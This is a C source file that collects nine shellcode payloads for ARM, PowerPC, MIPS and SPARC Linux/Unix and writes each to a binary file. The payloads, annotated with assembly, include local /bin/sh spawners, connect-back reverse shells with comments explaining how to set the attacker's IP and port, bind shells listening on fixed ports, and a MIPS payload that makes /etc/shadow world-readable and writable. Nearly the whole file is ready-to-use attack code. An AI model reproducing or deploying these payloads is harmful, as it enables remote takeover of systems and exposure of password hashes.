
#include <stdio.h>
#include <string.h>
 
char lae[] = "\x01\x30\x8f\xe2"
            "\x13\xff\x2f\xe1"
            "\x78\x46\x08\x30"
            "\x49\x1a\x92\x1a"
            "\x0b\x27\x01\xdf"
            "\x2f\x62\x69\x6e"
            "\x2f\x73\x68";
             
/* execve-core.c by Charles Stevenson <core@bokeoa.com> */
char lpe[] = /* execve /bin/sh linux/ppc by core */
// Sometimes you can comment out the next line if space is needed
"\x7c\x3f\x0b\x78"  /*mr    r31,r1*/
"\x7c\xa5\x2a\x79"  /*xor.  r5,r5,r5*/
"\x42\x40\xff\xf9"  /*bdzl+ 10000454<main>*/
"\x7f\x08\x02\xa6"  /*mflr  r24*/
"\x3b\x18\x01\x34"  /*addi  r24,r24,308*/
"\x98\xb8\xfe\xfb"  /*stb   r5,-261(r24)*/
"\x38\x78\xfe\xf4"  /*addi  r3,r24,-268*/
"\x90\x61\xff\xf8"  /*stw   r3,-8(r1)*/
"\x38\x81\xff\xf8"  /*addi  r4,r1,-8*/
"\x90\xa1\xff\xfc"  /*stw   r5,-4(r1)*/
"\x3b\xc0\x01\x60"  /*li    r30,352*/
"\x7f\xc0\x2e\x70"  /*srawi r0,r30,5*/
"\x44\xde\xad\xf2"  /*.long 0x44deadf2*/
"/bin/shZ"; // the last byte becomes NULL

char lpr[] = /* connect back & execve /bin/sh linux/ppc by core */
"\x7c\x3f\x0b\x78"  /*mr    r31,r1*/
"\x3b\x40\x01\x0e"  /*li    r26,270*/
"\x3b\x5a\xfe\xf4"  /*addi  r26,r26,-268*/
"\x7f\x43\xd3\x78"  /*mr    r3,r26*/
"\x3b\x60\x01\x0d"  /*li    r27,269*/
"\x3b\x7b\xfe\xf4"  /*addi  r27,r27,-268*/
"\x7f\x64\xdb\x78"  /*mr    r4,r27*/
"\x7c\xa5\x2a\x78"  /*xor   r5,r5,r5*/
"\x7c\x3c\x0b\x78"  /*mr    r28,r1*/
"\x3b\x9c\x01\x0c"  /*addi  r28,r28,268*/
"\x90\x7c\xff\x08"  /*stw   r3,-248(r28)*/
"\x90\x9c\xff\x0c"  /*stw   r4,-244(r28)*/
"\x90\xbc\xff\x10"  /*stw   r5,-240(r28)*/
"\x7f\x63\xdb\x78"  /*mr    r3,r27*/
"\x3b\xdf\x01\x0c"  /*addi  r30,r31,268*/
"\x38\x9e\xff\x08"  /*addi  r4,r30,-248*/
"\x3b\x20\x01\x98"  /*li    r25,408*/
"\x7f\x20\x16\x70"  /*srawi r0,r25,2*/
"\x44\xde\xad\xf2"  /*.long 0x44deadf2*/
"\x7c\x78\x1b\x78"  /*mr    r24,r3*/
"\xb3\x5e\xff\x16"  /*sth   r26,-234(r30)*/
"\x7f\xbd\xea\x78"  /*xor   r29,r29,r29*/
// Craft your exploit to poke these value in. Right now it's set
// for port 31337 and ip 192.168.1.1. Here's an example
// core@morpheus:~$ printf "0x%02x%02x\n0x%02x%02x\n" 192 168 1 1
// 0xc0a8
// 0x0101
"\x63\xbd" /* PORT # */ "\x7a\x69"  /*ori   r29,r29,31337*/
"\xb3\xbe\xff\x18"  /*sth   r29,-232(r30)*/
"\x3f\xa0" /*IP(A.B) */ "\xc0\xa8"  /*lis   r29,-16216*/
"\x63\xbd" /*IP(C.D) */ "\x01\x01"  /*ori   r29,r29,257*/
"\x93\xbe\xff\x1a"  /*stw   r29,-230(r30)*/
"\x93\x1c\xff\x08"  /*stw   r24,-248(r28)*/
"\x3a\xde\xff\x16"  /*addi  r22,r30,-234*/
"\x92\xdc\xff\x0c"  /*stw   r22,-244(r28)*/
"\x3b\xa0\x01\x1c"  /*li    r29,284*/
"\x38\xbd\xfe\xf4"  /*addi  r5,r29,-268*/
"\x90\xbc\xff\x10"  /*stw   r5,-240(r28)*/
"\x7f\x20\x16\x70"  /*srawi r0,r25,2*/
"\x7c\x7a\xda\x14"  /*add   r3,r26,r27*/
"\x38\x9c\xff\x08"  /*addi  r4,r28,-248*/
"\x44\xde\xad\xf2"  /*.long0x44deadf2*/
"\x7f\x03\xc3\x78"  /*mr    r3,r24*/
"\x7c\x84\x22\x78"  /*xor   r4,r4,r4*/
"\x3a\xe0\x01\xf8"  /*li    r23,504*/
"\x7e\xe0\x1e\x70"  /*srawi r0,r23,3*/
"\x44\xde\xad\xf2"  /*.long 0x44deadf2*/
"\x7f\x03\xc3\x78"  /*mr    r3,r24*/
"\x7f\x64\xdb\x78"  /*mr    r4,r27*/
"\x7e\xe0\x1e\x70"  /*srawi r0,r23,3*/
"\x44\xde\xad\xf2"  /*.long 0x44deadf2*/
// comment out the next 4 lines to save 16 bytes and lose stderr
//"\x7f\x03\xc3\x78"    /*mr    r3,r24*/
//"\x7f\x44\xd3\x78"    /*mr    r4,r26*/
//"\x7e\xe0\x1e\x70"    /*srawi r0,r23,3*/
//"\x44\xde\xad\xf2"    /*.long 0x44deadf2*/
"\x7c\xa5\x2a\x79"  /*xor.  r5,r5,r5*/
"\x42\x40\xff\x35"  /*bdzl+ 10000454<main>*/
"\x7f\x08\x02\xa6"  /*mflr  r24*/
"\x3b\x18\x01\x34"  /*addi  r24,r24,308*/
"\x98\xb8\xfe\xfb"  /*stb   r5,-261(r24)*/
"\x38\x78\xfe\xf4"  /*addi  r3,r24,-268*/
"\x90\x61\xff\xf8"  /*stw   r3,-8(r1)*/
"\x38\x81\xff\xf8"  /*addi  r4,r1,-8*/
"\x90\xa1\xff\xfc"  /*stw   r5,-4(r1)*/
"\x3b\xc0\x01\x60"  /*li    r30,352*/
"\x7f\xc0\x2e\x70"  /*srawi r0,r30,5*/
"\x44\xde\xad\xf2"  /*.long 0x44deadf2*/
"/bin/shZ"; /* Z will become NULL */

// little endian
char lmel[] = {
    "\xff\xff\x06\x28" // slti $a2, $zero, -1
    "\xff\xff\xd0\x04" // bltzal $a2, p <p>
    "\xff\xff\x05\x28" // slti $a1, $zero, -1
    "\xb6\x01\x05\x24" // li $a1, 438
    "\x01\x10\xe4\x27" // addu $a0, $ra, 4097
    "\x1f\xf0\x84\x24" // addu $a0, $a0, -4065
    "\xaf\x0f\x02\x24" // li $v0, 4015
    "\x0c\x01\x01\x01" // syscall 0x40404
    "\xff\xff\x04\x28" // slti $a0, $zero, -1
    "\xa1\x0f\x02\x24" // li $v0, 4001
    "\x0c\x01\x01\x01" // syscall 0x40404
    "/etc/shadow"
};

char lme[] = {
    "\x50\x73\x06\x24" /*     li      a2,0x7350             */
    "\xff\xff\xd0\x04" /* LB: bltzal  a2,LB                 */
    "\x50\x73\x0f\x24" /*     li      $t7,0x7350 (nop)      */
    "\xff\xff\x06\x28" /*     slti    a2, $0,-1             */
    "\xe0\xff\xbd\x27" /*     addiu   sp,sp,-32             */
    "\xd7\xff\x0f\x24" /*     li      t7,-41                */
    "\x27\x78\xe0\x01" /*     nor     t7,t7,zero            */   
    "\x21\x20\xef\x03" /*     addu    a0,ra,t7              */
    "\xe8\xff\xa4\xaf" /*     sw      a0,-24(sp)            */
    "\xec\xff\xa0\xaf" /*     sw      zero,-20(sp)          */
    "\xe8\xff\xa5\x23" /*     addi    a1,sp,-24             */       
    "\xab\x0f\x02\x24" /*     li      v0,4011               */
    "\x0c\x01\x01\x01" /*     syscall                       */
    "/bin/sh"
};

char lmp[] = 
    "\xe0\xff\xbd\x27"  /*     addiu   sp,sp,-32                */
    "\xfd\xff\x0e\x24"  /*     li      t6,-3                    */
    "\x27\x20\xc0\x01"  /*     nor     a0,t6,zero               */
    "\x27\x28\xc0\x01"  /*     nor     a1,t6,zero               */
    "\xff\xff\x06\x28"  /*     slti    a2,zero,-1               */ 
    "\x57\x10\x02\x24"  /*     li      v0,4183 ( __NR_socket )  */
    "\x0c\x01\x01\x01"  /*     syscall                          */
    "\x50\x73\x0f\x24"  /*     li      t7,0x7350 (nop)          */
    "\xff\xff\x50\x30"  /*     andi    s0,v0,0xffff             */ 
    "\xef\xff\x0e\x24"  /*     li      t6,-17                   */
    "\x27\x70\xc0\x01"  /*     nor     t6,t6,zero               */
    "\x13\x37\x0d\x24"  /*     li      t5,0x3713 (port 0x1337)  */
    "\x04\x68\xcd\x01"  /*     sllv    t5,t5,t6                 */
    "\xff\xfd\x0e\x24"  /*     li      t6,-513                  */
    "\x27\x70\xc0\x01"  /*     nor     t6,t6,zero               */
    "\x25\x68\xae\x01"  /*     or      t5,t5,t6                 */
    "\xe0\xff\xad\xaf"  /*     sw      t5,-32(sp)               */
    "\xe4\xff\xa0\xaf"  /*     sw      zero,-28(sp)             */ 
    "\xe8\xff\xa0\xaf"  /*     sw      zero,-24(sp)             */
    "\xec\xff\xa0\xaf"  /*     sw      zero,-20(sp)             */
    "\x25\x20\x10\x02"  /*     or      a0,s0,s0                 */
    "\xef\xff\x0e\x24"  /*     li      t6,-17                   */
    "\x27\x30\xc0\x01"  /*     nor     a2,t6,zero               */
    "\xe0\xff\xa5\x23"  /*     addi    a1,sp,-32                */
    "\x49\x10\x02\x24"  /*     li      v0,4169 ( __NR_bind )    */
    "\x0c\x01\x01\x01"  /*     syscall                          */
    "\x50\x73\x0f\x24"  /*     li      t7,0x7350 (nop)          */
    "\x25\x20\x10\x02"  /*     or      a0,s0,s0                 */
    "\x01\x01\x05\x24"  /*     li      a1,257                   */
    "\x4e\x10\x02\x24"  /*     li      v0,4174 ( __NR_listen )  */ 
    "\x0c\x01\x01\x01"  /*     syscall                          */
    "\x50\x73\x0f\x24"  /*     li      t7,0x7350 (nop)          */
    "\x25\x20\x10\x02"  /*     or      a0,s0,s0                 */
    "\xff\xff\x05\x28"  /*     slti    a1,zero,-1               */
    "\xff\xff\x06\x28"  /*     slti    a2,zero,-1               */
    "\x48\x10\x02\x24"  /*     li      v0,4168 ( __NR_accept )  */
    "\x0c\x01\x01\x01"  /*     syscall                          */
    "\x50\x73\x0f\x24"  /*     li      t7,0x7350 (nop)          */
    "\xff\xff\x50\x30"  /*     andi    s0,v0,0xffff             */ 
    "\x25\x20\x10\x02"  /*     or      a0,s0,s0                 */
    "\xfd\xff\x0f\x24"  /*     li      t7,-3                    */
    "\x27\x28\xe0\x01"  /*     nor     a1,t7,zero               */
    "\xdf\x0f\x02\x24"  /*     li      v0,4063 ( __NR_dup2 )    */
    "\x0c\x01\x01\x01"  /*     syscall                          */
    "\x50\x73\x0f\x24"  /*     li      t7,0x7350 (nop)          */
    "\x25\x20\x10\x02"  /*     or      a0,s0,s0                 */
    "\x01\x01\x05\x28"  /*     slti    a1,zero,0x0101           */
    "\xdf\x0f\x02\x24"  /*     li      v0,4063 ( __NR_dup2 )    */
    "\x0c\x01\x01\x01"  /*     syscall                          */
    "\x50\x73\x0f\x24"  /*     li      t7,0x7350 (nop)          */
    "\x25\x20\x10\x02"  /*     or      a0,s0,s0                 */
    "\xff\xff\x05\x28"  /*     slti    a1,zero,-1               */ 
    "\xdf\x0f\x02\x24"  /*     li      v0,4063 ( __NR_dup2 )    */
    "\x0c\x01\x01\x01"  /*     syscall                          */
    "\x50\x73\x0f\x24"  /*     li      t7,0x7350 (nop)          */
    "\x50\x73\x06\x24"  /*     li      a2,0x7350                */
    "\xff\xff\xd0\x04"  /* LB: bltzal  a2,LB                    */
    "\x50\x73\x0f\x24"  /*     li      t7,0x7350 (nop)          */
    "\xff\xff\x06\x28"  /*     slti    a2,zero,-1               */
    "\xdb\xff\x0f\x24"  /*     li      t7,-37                   */
    "\x27\x78\xe0\x01"  /*     nor     t7,t7,zero               */
    "\x21\x20\xef\x03"  /*     addu    a0,ra,t7                 */
    "\xf0\xff\xa4\xaf"  /*     sw      a0,-16(sp)               */
    "\xf4\xff\xa0\xaf"  /*     sw      zero,-12(sp)             */
    "\xf0\xff\xa5\x23"  /*     addi    a1,sp,-16                */
    "\xab\x0f\x02\x24"  /*     li      v0,4011 ( __NR_execve )  */
    "\x0c\x01\x01\x01"  /*     syscall                          */
    "/bin/sh";
    
char lsr[]=
  "\x9d\xe3\xbf\x80"    // save  %sp, -128, %sp
  "\x90\x10\x20\x02"    // mov  2, %o0
  "\xd0\x37\xbf\xe0"    // sth  %o0, [ %fp + -32 ]
  "\x90\x10\x29\x09"    // mov  0x909, %o0
  "\xd0\x37\xbf\xe2"    // sth  %o0, [ %fp + -30 ]
  "\x13\x30\x2a\x19"    // sethi  %hi(0xc0a86400), %o1 <- IPv4 ADDRESS MODIFY THIS.
  "\x90\x12\x60\x01"    // or  %o1, 1, %o0             <- ALSO THIS.
  "\xd0\x27\xbf\xe4"    // st  %o0, [ %fp + -28 ]
  "\x90\x10\x20\x02"    // mov  2, %o0
  "\x92\x10\x20\x01"    // mov  1, %o1
  "\x94\x22\x60\x01"    // sub  %o1, 1, %o2
  "\xd0\x23\xa0\x44"    // st  %o0, [ %sp + 0x44 ]
  "\xd2\x23\xa0\x48"    // st  %o1, [ %sp + 0x48 ]
  "\xd4\x23\xa0\x4c"    // st  %o2, [ %sp + 0x4c ]
  "\x90\x10\x20\x01"    // mov  1, %o0
  "\x92\x03\xa0\x44"    // add  %sp, 0x44, %o1
  "\x82\x10\x20\xce"    // mov  0xce, %g1
  "\x91\xd0\x20\x10"    // ta  0x10
  "\xd0\x27\xbf\xf4"    // st  %o0, [ %fp + -12 ]
  "\x92\x07\xbf\xe0"    // add  %fp, -32, %o1
  "\xd0\x07\xbf\xf4"    // ld  [ %fp + -12 ], %o0
  "\x94\x10\x20\x10"    // mov  0x10, %o2
  "\xd0\x23\xa0\x44"    // st  %o0, [ %sp + 0x44 ]
  "\xd2\x23\xa0\x48"    // st  %o1, [ %sp + 0x48 ]
  "\xd4\x23\xa0\x4c"    // st  %o2, [ %sp + 0x4c ]
  "\x90\x10\x20\x03"    // mov  3, %o0
  "\x92\x03\xa0\x44"    // add  %sp, 0x44, %o1
  "\x82\x10\x20\xce"    // mov  0xce, %g1
  "\x91\xd0\x20\x10"    // ta  0x10
  "\xd0\x07\xbf\xf4"    // ld  [ %fp + -12 ], %o0
  "\x92\x1a\x40\x09"    // xor  %o1, %o1, %o1
  "\x82\x10\x20\x5a"    // mov  0x5a, %g1
  "\x91\xd0\x20\x10"    // ta  0x10
  "\xd0\x07\xbf\xf4"    // ld  [ %fp + -12 ], %o0
  "\x92\x10\x20\x01"    // mov  1, %o1
  "\x82\x10\x20\x5a"    // mov  0x5a, %g1
  "\x91\xd0\x20\x10"    // ta  0x10
  "\xd0\x07\xbf\xf4"    // ld  [ %fp + -12 ], %o0
  "\x92\x10\x20\x02"    // mov  2, %o1
  "\x82\x10\x20\x5a"    // mov  0x5a, %g1
  "\x91\xd0\x20\x10"    // ta  0x10
  "\x2d\x0b\xd8\x9a"    // sethi  %hi(0x2f626800), %l6
  "\xac\x15\xa1\x6e"    // or  %l6, 0x16e, %l6
  "\x2f\x0b\xdc\xda"    // sethi  %hi(0x2f736800), %l7
  "\x90\x0b\x80\x0e"    // and  %sp, %sp, %o0
  "\x92\x03\xa0\x08"    // add  %sp, 8, %o1
  "\xa6\x10\x20\x01"    // mov  1, %l3
  "\x94\x24\xe0\x01"    // sub  %l3, 1, %o2
  "\x9c\x03\xa0\x10"    // add  %sp, 0x10, %sp
  "\xec\x3b\xbf\xf0"    // std  %l6, [ %sp + -16 ]
  "\xd0\x23\xbf\xf8"    // st  %o0, [ %sp + -8 ]
  "\xc0\x23\xbf\xfc"    // clr  [ %sp + -4 ]
  "\x82\x10\x20\x3b"    // mov  0x3b, %g1
  "\x91\xd0\x20\x10";   // ta  0x10
  
char lsp[]=
  "\x9d\xe3\xbf\x78"    //  save  %sp, -136, %sp
  "\x90\x10\x20\x02"    //  mov  2, %o0
  "\x92\x10\x20\x01"    //  mov  1, %o1
  "\x94\x22\x80\x0a"    //  sub  %o2, %o2, %o2
  "\xd0\x23\xa0\x44"    //  st  %o0, [ %sp + 0x44 ]
  "\xd2\x23\xa0\x48"    //  st  %o1, [ %sp + 0x48 ]
  "\xd4\x23\xa0\x4c"    //  st  %o2, [ %sp + 0x4c ]
  "\x90\x10\x20\x01"    //  mov  1, %o0
  "\x92\x03\xa0\x44"    //  add  %sp, 0x44, %o1
  "\x82\x10\x20\xce"    //  mov  0xce, %g1
  "\x91\xd0\x20\x10"    //  ta  0x10
  "\xd0\x27\xbf\xf4"    //  st  %o0, [ %fp + -12 ]
  "\x90\x10\x20\x02"    //  mov  2, %o0
  "\xd0\x37\xbf\xd8"    //  sth  %o0, [ %fp + -40 ]
  "\x13\x08\xc8\xc8"    //  sethi  %hi(0x23232000), %o1
  "\x90\x12\x63\x0f"    //  or  %o1, 0x30f, %o0
  "\xd0\x37\xbf\xda"    //  sth  %o0, [ %fp + -38 ]
  "\xc0\x27\xbf\xdc"    //  clr  [ %fp + -36 ]
  "\x92\x07\xbf\xd8"    //  add  %fp, -40, %o1
  "\xd0\x07\xbf\xf4"    //  ld  [ %fp + -12 ], %o0
  "\x94\x10\x20\x10"    //  mov  0x10, %o2
  "\xd0\x23\xa0\x44"    //  st  %o0, [ %sp + 0x44 ]
  "\xd2\x23\xa0\x48"    //  st  %o1, [ %sp + 0x48 ]
  "\xd4\x23\xa0\x4c"    //  st  %o2, [ %sp + 0x4c ]
  "\x90\x10\x20\x02"    //  mov  2, %o0
  "\x92\x03\xa0\x44"    //  add  %sp, 0x44, %o1
  "\x82\x10\x20\xce"    //  mov  0xce, %g1
  "\x91\xd0\x20\x10"    //  ta  0x10
  "\xd0\x07\xbf\xf4"    //  ld  [ %fp + -12 ], %o0
  "\x92\x10\x20\x05"    //  mov  5, %o1
  "\xd0\x23\xa0\x44"    //  st  %o0, [ %sp + 0x44 ]
  "\xd2\x23\xa0\x48"    //  st  %o1, [ %sp + 0x48 ]
  "\x90\x10\x20\x04"    //  mov  4, %o0
  "\x92\x03\xa0\x44"    //  add  %sp, 0x44, %o1
  "\x82\x10\x20\xce"    //  mov  0xce, %g1
  "\x91\xd0\x20\x10"    //  ta  0x10
  "\x92\x07\xbf\xd8"    //  add  %fp, -40, %o1
  "\x94\x07\xbf\xec"    //  add  %fp, -20, %o2
  "\xd0\x07\xbf\xf4"    //  ld  [ %fp + -12 ], %o0
  "\xd0\x23\xa0\x44"    //  st  %o0, [ %sp + 0x44 ]
  "\xd2\x23\xa0\x48"    //  st  %o1, [ %sp + 0x48 ]
  "\xd4\x23\xa0\x4c"    //  st  %o2, [ %sp + 0x4c ]
  "\x90\x10\x20\x05"    //  mov  5, %o0
  "\x92\x03\xa0\x44"    //  add  %sp, 0x44, %o1
  "\x82\x10\x20\xce"    //  mov  0xce, %g1
  "\x91\xd0\x20\x10"    //  ta  0x10
  "\xd0\x27\xbf\xf0"    //  st  %o0, [ %fp + -16 ]
  "\xd0\x07\xbf\xf0"    //  ld  [ %fp + -16 ], %o0
  "\x92\x22\x40\x09"    //  sub  %o1, %o1, %o1
  "\x82\x10\x20\x5a"    //  mov  0x5a, %g1
  "\x91\xd0\x20\x10"    //  ta  0x10
  "\xd0\x07\xbf\xf0"    //  ld  [ %fp + -16 ], %o0
  "\x92\x10\x20\x01"    //  mov  1, %o1
  "\x82\x10\x20\x5a"    //  mov  0x5a, %g1
  "\x91\xd0\x20\x10"    //  ta  0x10
  "\xd0\x07\xbf\xf0"    //  ld  [ %fp + -16 ], %o0
  "\x92\x10\x20\x02"    //  mov  2, %o1
  "\x82\x10\x20\x5a"    //  mov  0x5a, %g1
  "\x91\xd0\x20\x10"    //  ta  0x10
  "\x2d\x0b\xd8\x9a"    //  sethi  %hi(0x2f626800), %l6
  "\xac\x15\xa1\x6e"    //  or  %l6, 0x16e, %l6
  "\x2f\x0b\xdc\xda"    //  sethi  %hi(0x2f736800), %l7
  "\x90\x0b\x80\x0e"    //  and  %sp, %sp, %o0
  "\x92\x03\xa0\x08"    //  add  %sp, 8, %o1
  "\x94\x22\x80\x0a"    //  sub  %o2, %o2, %o2
  "\x9c\x03\xa0\x10"    //  add  %sp, 0x10, %sp
  "\xec\x3b\xbf\xf0"    //  std  %l6, [ %sp + -16 ]
  "\xd0\x23\xbf\xf8"    //  st  %o0, [ %sp + -8 ]
  "\xc0\x23\xbf\xfc"    //  clr  [ %sp + -4 ]
  "\x82\x10\x20\x3b"    //  mov  0x3b, %g1
  "\x91\xd0\x20\x10";   //  ta  0x10
  
char lse[]=
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4>        */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode>          */
    "\x7f\xff\xff\xff"     /* call    <shellcode+4>        */
    "\x90\x03\xe0\x20"     /* add     %o7,32,%o0           */
    "\x92\x02\x20\x10"     /* add     %o0,16,%o1           */
    "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]          */
    "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]         */
    "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]         */
    "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "/bin/ksh"
;
  
char *code[]={lae, lpe, lpr, lmel, lme, lmp, lsr, lsp, lse };
  
int main(void)
{
  int  i;
  char name[BUFSIZ];
  FILE *out;
  
  for (i=0; i<sizeof(code)/sizeof(char*); i++) { 
    _snprintf(name, sizeof(name), "sc_%i.bin", (i+1)); 
    out=fopen(name, "wb");  
    fwrite(code[i], strlen(code[i]), 1, out);
    fclose(out);
  }
  return 0;
}
    